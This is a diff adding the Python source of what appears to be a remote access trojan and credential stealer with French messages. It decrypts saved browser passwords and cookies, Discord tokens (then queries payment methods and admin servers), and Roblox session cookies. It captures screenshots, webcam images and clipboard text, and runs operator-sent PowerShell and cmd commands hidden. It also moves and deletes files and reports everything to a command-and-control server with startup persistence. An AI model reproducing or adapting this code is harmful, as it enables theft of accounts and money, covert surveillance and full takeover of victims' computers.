+    if not os.path.exists(local_state):
+        return None
+    try:
+        with open(local_state, "r", encoding="utf-8") as f:
+            state = json.load(f)
+        encrypted_key_b64 = state.get("os_crypt", {}).get("encrypted_key")
+        if not encrypted_key_b64:
+            return None
+        encrypted_key = base64.b64decode(encrypted_key_b64)[5:]
+        return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
+    except:
+        return None
+
+def extract_edge_data():
+    if not IS_ADMIN:
+        return {'passwords': [], 'cookies': []}
+    edge_path = os.path.join(os.getenv('LOCALAPPDATA'), 'Microsoft', 'Edge', 'User Data')
+    if not os.path.exists(edge_path):
+        return {'passwords': [], 'cookies': []}
+    kill_browser_process('edge')
+    key = get_edge_app_bound_key(os.path.join(edge_path, 'Local State'))
+    if not key:
+        key = get_standard_edge_key(edge_path)
+    if not key:
+        return {'passwords': [], 'cookies': []}
+
+    all_passwords = []
+    all_cookies = []
+
+    def decrypt_v20(enc_val, k):
+        try:
+            if enc_val[:3] != b'v20':
+                return None
+            nonce = enc_val[3:15]
+            tag = enc_val[-16:]
+            data = enc_val[15:-16]
+            cipher = AES.new(k, AES.MODE_GCM, nonce=nonce)
+            decrypted = cipher.decrypt_and_verify(data, tag)
+            if len(decrypted) > 32:
+                return decrypted[32:].decode('utf-8', errors='ignore')
+            return decrypted.decode('utf-8', errors='ignore')
+        except:
+            return None
+
+    def decrypt_v10(enc_val, k=None):
+        try:
+            return win32crypt.CryptUnprotectData(enc_val, None, None, None, 0)[1].decode("utf-8")
+        except:
+            return None
+
+    profiles = []
+    for item in os.listdir(edge_path):
+        prof_path = os.path.join(edge_path, item)
+        if os.path.isdir(prof_path) and (os.path.exists(os.path.join(prof_path, "Login Data")) or os.path.exists(os.path.join(prof_path, "Network", "Cookies"))):
+            profiles.append((item, prof_path))
+
+    for profile_name, profile_path in profiles:
+        login_db = os.path.join(profile_path, "Login Data")
+        if os.path.exists(login_db):
+            try:
+                tmp = tempfile.NamedTemporaryFile(delete=False)
+                tmp.close()
+                shutil.copy2(login_db, tmp.name)
+                conn = sqlite3.connect(tmp.name)
+                cur = conn.cursor()
+                cur.execute("SELECT name FROM sqlite_master WHERE type='table' AND name='logins'")
+                if cur.fetchone():
+                    for origin_url, username, password_value in cur.execute("SELECT origin_url, username_value, password_value FROM logins"):
+                        if username and password_value:
+                            password = None
+                            if password_value[:3] == b'v20':
+                                password = decrypt_v20(password_value, key)
+                            if not password:
+                                password = decrypt_v10(password_value)
+                            if password:
+                                all_passwords.append({'browser':'Edge','profile':profile_name,'url':origin_url,'username':username,'password':password})
+                conn.close()
+                os.unlink(tmp.name)
+            except:
+                pass
+        cookie_db = os.path.join(profile_path, "Network", "Cookies")
+        if os.path.exists(cookie_db) and wait_for_file_unlock(cookie_db):
+            try:
+                tmp = tempfile.NamedTemporaryFile(delete=False)
+                tmp.close()
+                shutil.copy2(cookie_db, tmp.name)
+                conn = sqlite3.connect(tmp.name)
+                cur = conn.cursor()
+                cur.execute("SELECT name FROM sqlite_master WHERE type='table' AND name='cookies'")
+                if cur.fetchone():
+                    current_time = datetime.now(timezone.utc)
+                    for host_key, name, encrypted_value, expires_utc, is_secure, is_httponly, same_site in cur.execute(
+                        "SELECT host_key, name, CAST(encrypted_value AS BLOB), expires_utc, is_secure, is_httponly, sameSite FROM cookies"):
+                        if any(host_key.endswith(domain) for domain in EXCLUDE_DOMAINS):
+                            continue
+                        if expires_utc and expires_utc != 0:
+                            expires_dt = datetime.fromtimestamp(expires_utc / 1000000 - 11644473600, tz=timezone.utc)
+                            if expires_dt < current_time:
+                                continue
+                        else:
+                            expires_dt = None
+                        cookie_value = None
+                        if encrypted_value and encrypted_value[:3] == b'v20':
+                            cookie_value = decrypt_v20(encrypted_value, key)
+                        if not cookie_value:
+                            cookie_value = decrypt_v10(encrypted_value)
+                        if cookie_value:
+                            all_cookies.append({'browser':'Edge','profile':profile_name,'host':host_key.lstrip('.'),'name':name,'value':cookie_value,'expires':expires_dt.strftime('%Y-%m-%d %H:%M:%S') if expires_dt else 'Session','secure':bool(is_secure),'httponly':bool(is_httponly)})
+                conn.close()
+                os.unlink(tmp.name)
+            except:
+                pass
+    return {'passwords': all_passwords, 'cookies': all_cookies}
+
+def collect_all_browsers_data():
+    all_pw = []
+    all_ck = []
+    try:
+        opera_path = os.path.join(os.environ["APPDATA"], "Opera Software", "Opera Stable")
+        data = extract_chromium_browser('Opera', opera_path)
+        all_pw.extend(data['passwords'])
+        all_ck.extend(data['cookies'])
+    except: pass
+    try:
+        operagx_path = os.path.join(os.environ["APPDATA"], "Opera Software", "Opera GX Stable")
+        data = extract_chromium_browser('Opera GX', operagx_path)
+        all_pw.extend(data['passwords'])
+        all_ck.extend(data['cookies'])
+    except: pass
+    try:
+        ff = extract_firefox_data()
+        all_pw.extend(ff['passwords'])
+        all_ck.extend(ff['cookies'])
+    except: pass
+    try:
+        brave = extract_brave_data()
+        all_pw.extend(brave['passwords'])
+        all_ck.extend(brave['cookies'])
+    except: pass
+    try:
+        edge = extract_edge_data()
+        all_pw.extend(edge['passwords'])
+        all_ck.extend(edge['cookies'])
+    except: pass
+    return {'passwords': all_pw, 'cookies': all_ck}
+
+def get_discord_tokens():
+    result = []
+    checked_tokens = set()
+    seen_user_ids = set()
+    
+    for platform, path in PATHS.items():
+        if not os.path.exists(path):
+            continue
+        
+        tokens_list = gettokens(path)
+        if not tokens_list:
+            continue
+            
+        for token_enc in tokens_list:
+            try:
+                token_enc = token_enc.replace("\\", "") if token_enc.endswith("\\") else token_enc
+                
+                key = getkey(path)
+                if not key:
+                    continue
+                    
+                try:
+                    decrypted_key = win32crypt.CryptUnprotectData(
+                        base64.b64decode(key)[5:], None, None, None, 0
+                    )[1]
+                except:
+                    continue
+                
+                encrypted_token = token_enc.split('dQw4w9WgXcQ:')
+                if len(encrypted_token) < 2:
+                    continue
+                    
+                encrypted_token = encrypted_token[1]
+                nonce = base64.b64decode(encrypted_token)[3:15]
+                ciphertext = base64.b64decode(encrypted_token)[15:]
+                
+                try:
+                    token = AES.new(decrypted_key, AES.MODE_GCM, nonce).decrypt(ciphertext)[:-16].decode()
+                except:
+                    continue
+                
+                if token in checked_tokens:
+                    continue
+                checked_tokens.add(token)
+                
+                headers = getheaders(token)
+                
+                try:
+                    r = requests.get(
+                        'https://discord.com/api/v10/users/@me',
+                        headers=headers,
+                        timeout=8
+                    )
+                    if r.status_code != 200:
+                        continue
+                    user = r.json()
+                except:
+                    continue
+                
+                user_id = user.get('id')
+                if not user_id or user_id in seen_user_ids:
+                    continue
+                seen_user_ids.add(user_id)
+                
+                friends_count = 0
+                try:
+                    r_friends = requests.get(
+                        'https://discord.com/api/v9/users/@me/relationships',
+                        headers=headers,
+                        timeout=8
+                    )
+                    if r_friends.status_code == 200:
+                        friends_data = r_friends.json()
+                        friends_count = len(friends_data) if isinstance(friends_data, list) else 0
+                except:
+                    pass
+                
+                guilds_count = 0
+                admin_guilds = []
+                
+                try:
+                    r_guilds = requests.get(
+                        'https://discordapp.com/api/v6/users/@me/guilds?with_counts=true',
+                        headers=headers,
+                        timeout=12
+                    )
+                    if r_guilds.status_code == 200:
+                        guilds_data = r_guilds.json()
+                        if isinstance(guilds_data, list):
+                            guilds_count = len(guilds_data)
+                            
+                            for guild in guilds_data:
+                                if not isinstance(guild, dict):
+                                    continue
+                                    
+                                permissions = guild.get('permissions', 0)
+                                
+                                if (permissions & 0x8) or (permissions & 0x20):
+                                    guild_name = guild.get('name', 'Unknown')
+                                    guild_id = guild.get('id', '0')
+                                    
+                                    member_count = 0
+                                    vanity = None
+
+                                    try:
+                                        rg = requests.get(
+                                            f'https://discord.com/api/v6/guilds/{guild_id}',
+                                            headers=headers,
+                                            timeout=8
+                                        )
+                                        if rg.status_code == 200:
+                                            gdata = rg.json()
+                                            if gdata.get('name'):
+                                                guild_name = gdata.get('name')
+                                            member_count = gdata.get('approximate_member_count', 0)
+                                            vanity = gdata.get('vanity_url_code')
+                                    except:
+                                        pass
+
+                                    if not member_count:
+                                        try:
+                                            rg2 = requests.get(
+                                                f'https://discord.com/api/v9/guilds/{guild_id}?with_counts=true',
+                                                headers=headers,
+                                                timeout=8
+                                            )
+                                            if rg2.status_code == 200:
+                                                gdata2 = rg2.json()
+                                                member_count = gdata2.get('approximate_member_count', 0)
+                                        except:
+                                            pass
+
+                                    if not member_count:
+                                        try:
+                                            rpreview = requests.get(
+                                                f'https://discord.com/api/v9/guilds/{guild_id}/preview',
+                                                headers=headers,
+                                                timeout=8
+                                            )
+                                            if rpreview.status_code == 200:
+                                                pdata = rpreview.json()
+                                                member_count = pdata.get('approximate_member_count', 0)
+                                        except:
+                                            pass
+
+                                    if not member_count:
+                                        try:
+                                            rwidget = requests.get(
+                                                f'https://discord.com/api/v9/guilds/{guild_id}/widget.json',
+                                                headers=headers,
+                                                timeout=8
+                                            )
+                                            if rwidget.status_code == 200:
+                                                wdata = rwidget.json()
+                                                member_count = wdata.get('presence_count', 0)
+                                                if not member_count:
+                                                    members_list = wdata.get('members', [])
+                                                    member_count = len(members_list)
+                                        except:
+                                            pass
+
+                                    admin_guilds.append({
+                                        'name': guild_name,
+                                        'id': guild_id,
+                                        'member_count': member_count,
+                                        'vanity': vanity
+                                    })
+                except:
+                    pass
+                
+                admin_guilds.sort(key=lambda x: x.get('member_count', 0), reverse=True)
+                
+                has_nitro = False
+                nitro_expiry = None
+                try:
+                    r_nitro = requests.get(
+                        'https://discord.com/api/v9/users/@me/billing/subscriptions',
+                        headers=headers,
+                        timeout=8
+                    )
+                    if r_nitro.status_code == 200:
+                        nitro_data = r_nitro.json()
+                        if isinstance(nitro_data, list) and len(nitro_data) > 0:
+                            has_nitro = True
+                            try:
+                                expiry = nitro_data[0].get("current_period_end")
+                                if expiry:
+                                    nitro_expiry = datetime.strptime(
+                                        expiry, "%Y-%m-%dT%H:%M:%S.%f%z"
+                                    ).strftime('%d/%m/%Y at %H:%M:%S')
+                            except:
+                                nitro_expiry = "Unknown"
+                except:
+                    pass
+                
+                available_boosts = 0
+                try:
+                    r_boosts = requests.get(
+                        'https://discord.com/api/v9/users/@me/guilds/premium/subscription-slots',
+                        headers=headers,
+                        timeout=8
+                    )
+                    if r_boosts.status_code == 200:
+                        boosts_data = r_boosts.json()
+                        if isinstance(boosts_data, list):
+                            for slot in boosts_data:
+                                try:
+                                    cooldown = datetime.fromisoformat(
+                                        slot.get("cooldown_ends_at", "").replace('Z', '+00:00')
+                                    )
+                                    if cooldown <= datetime.now(timezone.utc):
+                                        available_boosts += 1
+                                except:
+                                    pass
+                except:
+                    pass
+                
+                payment_methods = []
+                valid_methods = 0
+                try:
+                    r_payments = requests.get(
+                        'https://discord.com/api/v9/users/@me/billing/payment-sources',
+                        headers=headers,
+                        timeout=8
+                    )
+                    if r_payments.status_code == 200:
+                        payments_data = r_payments.json()
+                        if isinstance(payments_data, list):
+                            for pm in payments_data:
+                                if pm.get('type') == 1:
+                                    payment_methods.append({
+                                        'type': 'CreditCard',
+                                        'invalid': pm.get('invalid', False)
+                                    })
+                                    if not pm.get('invalid', False):
+                                        valid_methods += 1
+                                elif pm.get('type') == 2:
+                                    payment_methods.append({
+                                        'type': 'PayPal',
+                                        'invalid': pm.get('invalid', False)
+                                    })
+                                    if not pm.get('invalid', False):
+                                        valid_methods += 1
+                except:
+                    pass
+                
+                avatar = user.get('avatar')
+                discriminator = user.get('discriminator', '0')
+                if avatar:
+                    if avatar.startswith('a_'):
+                        avatar_url = f"https://cdn.discordapp.com/avatars/{user_id}/{avatar}.gif?size=256"
+                    else:
+                        avatar_url = f"https://cdn.discordapp.com/avatars/{user_id}/{avatar}.png?size=256"
+                else:
+                    try:
+                        avatar_url = f"https://cdn.discordapp.com/embed/avatars/{int(discriminator) % 5}.png"
+                    except:
+                        avatar_url = "https://cdn.discordapp.com/embed/avatars/0.png"
+                
+                result.append({
+                    'token': token,
+                    'user_id': user_id,
+                    'username': user.get('username', 'Unknown'),
+                    'discriminator': discriminator,
+                    'avatar_url': avatar_url,
+                    'email': user.get('email'),
+                    'phone': user.get('phone'),
+                    'mfa_enabled': user.get('mfa_enabled', False),
+                    'verified': user.get('verified', False),
+                    'flags': user.get('flags', 0),
+                    'locale': user.get('locale', 'Unknown'),
+                    'guilds_count': guilds_count,
+                    'friends_count': friends_count,
+                    'admin_guilds': admin_guilds,
+                    'has_nitro': has_nitro,
+                    'nitro_expiry': nitro_expiry,
+                    'available_boosts': available_boosts,
+                    'payment_methods': payment_methods,
+                    'valid_payment_methods': valid_methods,
+                    'platform': platform
+                })
+                
+            except Exception:
+                continue
+    
+    return result
+
+def get_roblox_cookie_and_username():
+    try:
+        profile = os.getenv("USERPROFILE")
+        roblox_path = os.path.join(profile, "AppData", "Local", "Roblox", "LocalStorage", "robloxcookies.dat")
+        if not os.path.exists(roblox_path):
+            return None
+        tmp_dir = os.getenv("TEMP") or os.path.expanduser("~\\AppData\\Local\\Temp")
+        dest = os.path.join(tmp_dir, f"rc_{datetime.now():%Y%m%d_%H%M%S}.dat")
+        shutil.copy(roblox_path, dest)
+        data = None
+        try:
+            with open(dest, 'r', encoding='utf-8') as f:
+                data = json.load(f)
+        except:
+            pass
+        finally:
+            if os.path.exists(dest):
+                try: os.remove(dest)
+                except: pass
+        if not data or "CookiesData" not in data:
+            return None
+        encoded = data["CookiesData"]
+        decoded = base64.b64decode(encoded)
+        decrypted = win32crypt.CryptUnprotectData(decoded, None, None, None, 0)[1]
+        cookies_str = decrypted.decode('utf-8', errors='ignore')
+        for line in cookies_str.split(';'):
+            line = line.strip()
+            if '.ROBLOSECURITY' in line:
+                cookie_value = line.split('=', 1)[1].strip() if '=' in line else line.split('.ROBLOSECURITY')[-1].strip()
+                parts = cookie_value.split()
+                cookie_value = parts[-1] if parts else cookie_value
+                if not cookie_value.startswith('_|WARNING:'):
+                    continue
+                session = requests.Session()
+                session.headers.update({
+                    "Cookie": f".ROBLOSECURITY={cookie_value}",
+                    "User-Agent": "Roblox/WinInet",
+                    "Accept": "application/json",
+                    "Referer": "https://www.roblox.com/"
+                })
+                r = session.get("https://users.roblox.com/v1/users/authenticated", timeout=8)
+                if r.status_code == 200:
+                    username = r.json().get("name")
+                    return {'cookie': cookie_value, 'username': username}
+                elif r.status_code in (401, 403):
+                    csrf_resp = session.post("https://auth.roblox.com/v2/logout", timeout=6)
+                    csrf = csrf_resp.headers.get("x-csrf-token")
+                    if csrf:
+                        session.headers["x-csrf-token"] = csrf
+                        r2 = session.get("https://users.roblox.com/v1/users/authenticated", timeout=8)
+                        if r2.status_code == 200:
+                            username = r2.json().get("name")
+                            return {'cookie': cookie_value, 'username': username}
+                return {'cookie': cookie_value, 'username': None}
+        return None
+    except:
+        return None
+
+def take_screenshot():
+    try:
+        with mss.mss() as sct:
+            monitors = sct.monitors[1:]
+            screenshots = []
+            for i, mon in enumerate(monitors):
+                img = sct.grab(mon)
+                img_b64 = base64.b64encode(mss.tools.to_png(img.rgb, img.size)).decode()
+                screenshots.append({'monitor': i+1, 'data': img_b64})
+            return screenshots
+    except:
+        return []
+
+def take_webcam_screenshot():
+    try:
+        import cv2
+        cap = cv2.VideoCapture(0)
+        if not cap.isOpened():
+            cap = cv2.VideoCapture(1)
+        if not cap.isOpened():
+            return {'error': 'Aucune webcam détectée'}
+        
+        ret, frame = cap.read()
+        cap.release()
+        
+        if not ret:
+            return {'error': 'Impossible de capturer la webcam'}
+        
+        _, buffer = cv2.imencode('.jpg', frame)
+        img_b64 = base64.b64encode(buffer).decode()
+        return {'data': img_b64}
+    except ImportError:
+        return {'error': 'OpenCV non installé'}
+    except Exception as e:
+        return {'error': str(e)}
+
+def get_clipboard_text():
+    try:
+        return pyperclip.paste()
+    except:
+        return ""
+
+def list_processes():
+    procs = []
+    for proc in psutil.process_iter(['pid', 'name', 'cpu_percent', 'memory_percent', 'status']):
+        try:
+            info = proc.info
+            try:
+                cpu = proc.cpu_percent(interval=0.1)
+            except:
+                cpu = info['cpu_percent'] if info['cpu_percent'] is not None else 0.0
+            procs.append({
+                'pid': info['pid'],
+                'name': info['name'] or 'Unknown',
+                'cpu_percent': round(cpu, 1) if cpu else 0.0,
+                'memory_percent': round(info['memory_percent'], 1) if info['memory_percent'] is not None else 0.0,
+                'status': info['status']
+            })
+        except (psutil.NoSuchProcess, psutil.AccessDenied):
+            continue
+    return procs[:200]
+
+def suspend_process(pid):
+    try:
+        proc = psutil.Process(pid)
+        proc.suspend()
+        return {'success': True, 'message': f'Processus {pid} suspendu'}
+    except Exception as e:
+        return {'success': False, 'error': str(e)}
+
+def resume_process(pid):
+    try:
+        proc = psutil.Process(pid)
+        proc.resume()
+        return {'success': True, 'message': f'Processus {pid} repris'}
+    except Exception as e:
+        return {'success': False, 'error': str(e)}
+
+def kill_process(pid):
+    try:
+        proc = psutil.Process(pid)
+        proc.terminate()
+        return {'success': True, 'message': f'Process {pid} terminated'}
+    except Exception as e:
+        return {'success': False, 'error': str(e)}
+
+def execute_powershell(cmd):
+    try:
+        result = subprocess.run(['powershell', '-Command', cmd], capture_output=True, text=True, timeout=30, shell=True, creationflags=0x08000000)
+        return {'stdout': result.stdout, 'stderr': result.stderr, 'returncode': result.returncode}
+    except Exception as e:
+        return {'error': str(e)}
+
+def execute_cmd(cmd):
+    try:
+        result = subprocess.run(cmd, capture_output=True, text=True, timeout=30, shell=True, creationflags=0x08000000)
+        return {'stdout': result.stdout, 'stderr': result.stderr, 'returncode': result.returncode}
+    except Exception as e:
+        return {'error': str(e)}
+
+def list_directory(path=None):
+    if not path:
+        path = os.path.expanduser("~")
+    path = os.path.normpath(path)
+    while '\\\\' in path:
+        path = path.replace('\\\\', '\\')
+    try:
+        real_path = os.path.realpath(path)
+    except:
+        real_path = path
+    if not os.path.exists(real_path):
+        return {'error': f'Le chemin "{path}" n\'existe pas'}
+    if not os.path.isdir(real_path):
+        return {'error': f'"{path}" n\'est pas un dossier'}
+    try:
+        if not os.access(real_path, os.R_OK):
+            return {'error': f'Permission refusée pour accéder à "{path}"'}
+        items = []
+        try:
+            dir_contents = os.listdir(real_path)
+        except PermissionError:
+            return {'error': f'Permission refusée pour lister le contenu de "{path}"'}
+        except Exception as e:
+            return {'error': f'Erreur lors de la lecture de "{path}": {str(e)}'}
+        for item in dir_contents:
+            full_path = os.path.join(real_path, item)
+            try:
+                if os.path.islink(full_path):
+                    target = os.readlink(full_path)
+                    if not os.path.isabs(target):
+                        target = os.path.join(real_path, target)
+                    target = os.path.normpath(target)
+                    item_type = 'directory' if os.path.isdir(target) else 'file'
+                    display_path = target
+                else:
+                    display_path = full_path
+                    item_type = 'directory' if os.path.isdir(full_path) else 'file'
+                stat = os.stat(full_path)
+                items.append({
+                    'name': item,
+                    'path': display_path,
+                    'type': item_type,
+                    'size': stat.st_size if item_type == 'file' else 0,
+                    'size_str': format_bytes(stat.st_size) if item_type == 'file' else '',
+                    'modified': datetime.fromtimestamp(stat.st_mtime).isoformat()
+                })
+            except PermissionError:
+                items.append({
+                    'name': item,
+                    'path': full_path,
+                    'type': 'directory' if os.path.isdir(full_path) else 'file',
+                    'size': 0,
+                    'size_str': '',
+                    'modified': '',
+                    'access_denied': True
+                })
+            except:
+                items.append({
+                    'name': item,
+                    'path': full_path,
+                    'type': 'unknown',
+                    'size': 0,
+                    'size_str': '',
+                    'modified': ''
+                })
+        items.sort(key=lambda x: (x['type'] != 'directory', x['name'].lower()))
+        parent = os.path.dirname(real_path)
+        if parent == real_path or (os.path.splitdrive(real_path)[0] and parent == real_path):
+            parent = None
+        return {
+            'path': real_path,
+            'parent': parent,
+            'items': items[:500]
+        }
+    except Exception as e:
+        return {'error': str(e)}
+
+def download_file(file_path):
+    try:
+        if not os.path.exists(file_path):
+            return {'error': 'Fichier introuvable'}
+        if os.path.isdir(file_path):
+            return {'error': 'C\'est un dossier, pas un fichier'}
+        file_size = os.path.getsize(file_path)
+        if file_size > 50 * 1024 * 1024:
+            return {'error': 'Fichier trop volumineux (>50 Mo)'}
+        with open(file_path, 'rb') as f:
+            file_data = base64.b64encode(f.read()).decode()
+        return {
+            'name': os.path.basename(file_path),
+            'path': file_path,
+            'size': file_size,
+            'size_str': format_bytes(file_size),
+            'data': file_data
+        }
+    except Exception as e:
+        return {'error': str(e)}
+
+def upload_file(file_path, file_data_b64):
+    try:
+        file_data = base64.b64decode(file_data_b64)
+        os.makedirs(os.path.dirname(os.path.abspath(file_path)), exist_ok=True)
+        with open(file_path, 'wb') as f:
+            f.write(file_data)
+        return {
+            'success': True,
+            'path': os.path.abspath(file_path),
+            'size': len(file_data),
+            'size_str': format_bytes(len(file_data))
+        }
+    except Exception as e:
+        return {'error': str(e)}
+    
+def delete_path(path):
+    try:
+        real_path = os.path.realpath(os.path.normpath(path))
+        if not os.path.exists(real_path):
+            return {'success': False, 'error': f'Le chemin "{path}" n\'existe pas'}
+        if os.path.isfile(real_path) or os.path.islink(real_path):
+            os.remove(real_path)
+        elif os.path.isdir(real_path):
+            shutil.rmtree(real_path)
+        else:
+            return {'success': False, 'error': f'Type non supporté pour "{path}"'}
+        return {'success': True, 'message': f'"{path}" supprimé avec succès'}
+    except PermissionError:
+        return {'success': False, 'error': f'Permission refusée pour supprimer "{path}"'}
+    except Exception as e:
+        return {'success': False, 'error': str(e)}
+
+def handle_command(command):
+    cmd_type = command.get('type')
+    params = command.get('params', {})
+    
+    if cmd_type == 'ping':
+        result = {'ping': 'ok', 'timestamp': datetime.now().isoformat()}
+    elif cmd_type == 'system_info':
+        result = get_system_info()
+    elif cmd_type == 'discord_data':
+        result = get_discord_tokens()
+    elif cmd_type == 'roblox_cookie':
+        cookie_info = get_roblox_cookie_and_username()
+        result = cookie_info if cookie_info else {'error': 'Aucun cookie trouvé'}
+    elif cmd_type == 'browser_passwords':
+        data = collect_all_browsers_data()
+        result = data['passwords']
+    elif cmd_type == 'browser_cookies':
+        data = collect_all_browsers_data()
+        result = data['cookies']
+    elif cmd_type == 'screenshot':
+        result = take_screenshot()
+    elif cmd_type == 'screenshot_webcam':
+        result = take_webcam_screenshot()
+    elif cmd_type == 'clipboard':
+        result = get_clipboard_text()
+    elif cmd_type == 'list_processes':
+        result = list_processes()
+    elif cmd_type == 'kill_process':
+        pid = params.get('pid')
+        if pid:
+            result = kill_process(pid)
+        else:
+            result = {'error': 'missing pid'}
+    elif cmd_type == 'suspend_process':
+        pid = params.get('pid')
+        if pid: result = suspend_process(pid)
+        else: result = {'error': 'missing pid'}
+    elif cmd_type == 'resume_process':
+        pid = params.get('pid')
+        if pid: result = resume_process(pid)
+        else: result = {'error': 'missing pid'}
+    elif cmd_type == 'file_explorer':
+        path = params.get('path')
+        result = list_directory(path)
+    elif cmd_type == 'download_file':
+        file_path = params.get('path')
+        if file_path:
+            result = download_file(file_path)
+        else:
+            result = {'error': 'Chemin requis'}
+    elif cmd_type == 'upload_file':
+        file_path = params.get('path')
+        file_data = params.get('data')
+        if file_path and file_data:
+            result = upload_file(file_path, file_data)
+        else:
+            result = {'error': 'Chemin et données requis'}
+    elif cmd_type == 'delete_path':
+        path = params.get('path')
+        if path:
+            result = delete_path(path)
+        else:
+            result = {'error': 'Chemin requis pour la suppression'}
+    elif cmd_type == 'execute_ps':
+        cmd = params.get('command', '')
+        result = execute_powershell(cmd)
+    elif cmd_type == 'execute_cmd':
+        cmd = params.get('command', '')
+        result = execute_cmd(cmd)
+    else:
+        result = {'error': f'Unknown command: {cmd_type}'}
+    return result
+
+def send_heartbeat():
+    url = f"{SERVER_URL}/api/heartbeat"
+    data = get_system_info()
+    try:
+        response = requests.post(url, json=data, timeout=10)
+        if response.status_code == 200:
+            resp = response.json()
+            if 'token' in resp:
+                set_client_config('token', resp['token'])
+            return True
+    except:
+        pass
+    return False
+
+def get_commands():
+    token = get_client_config('token')
+    headers = {'Authorization': f'Bearer {token}'} if token else {}
+    try:
+        url = f"{SERVER_URL}/api/commands/{get_machine_id()}"
+        response = requests.get(url, headers=headers, timeout=10)
+        if response.status_code == 200:
+            return response.json().get('commands', [])
+    except:
+        pass
+    return []
+
+def send_command_result(command_id, result):
+    token = get_client_config('token')
+    headers = {'Authorization': f'Bearer {token}', 'Content-Type': 'application/json'} if token else {}
+    try:
+        url = f"{SERVER_URL}/api/command_result"
+        payload = {
+            'machine_id': get_machine_id(),
+            'command_id': command_id,
+            'result': result
+        }
+        requests.post(url, json=payload, headers=headers, timeout=10)
+    except:
+        pass
+
+def heartbeat_loop():
+    while True:
+        try:
+            send_heartbeat()
+        except:
+            pass
+        time.sleep(HEARTBEAT_INTERVAL)
+
+def command_poll_loop():
+    while True:
+        try:
+            commands = get_commands()
+            for cmd in commands:
+                result = handle_command(cmd)
+                send_command_result(cmd.get('id'), result)
+        except:
+            pass
+        time.sleep(COMMAND_POLL_INTERVAL)
+
+# ========== DÉMARRAGE PRINCIPAL ==========
+if __name__ == '__main__':
+    # Vérification anti-doublon
+    try:
+        import psutil
+        current_pid = os.getpid()
+        script_name = os.path.basename(__file__).lower()
+        count = 0
+        for proc in psutil.process_iter(['pid', 'cmdline']):
+            try:
+                if proc.info['pid'] == current_pid:
+                    count += 1
+                    continue
+                cmdline = proc.info.get('cmdline') or []
+                cmd_str = ' '.join(cmdline).lower()
+                if script_name in cmd_str:
+                    count += 1
+            except:
+                pass
+        if count > 1:
+            sys.exit(0)
+    except:
+        pass
+    
+    # Auto-update
+    perform_client_update()
+    
+    # Persistance
+    ensure_startup_persistence()
+    
+    # Premier heartbeat
+    send_heartbeat()
+    
+    # Boucles principales
+    threading.Thread(target=heartbeat_loop, daemon=True).start()
+    threading.Thread(target=command_poll_loop, daemon=True).start()
+    
+    # Maintenir en vie sans console
+    try:
+        while True:
+            time.sleep(60)
+    except:
+        pass
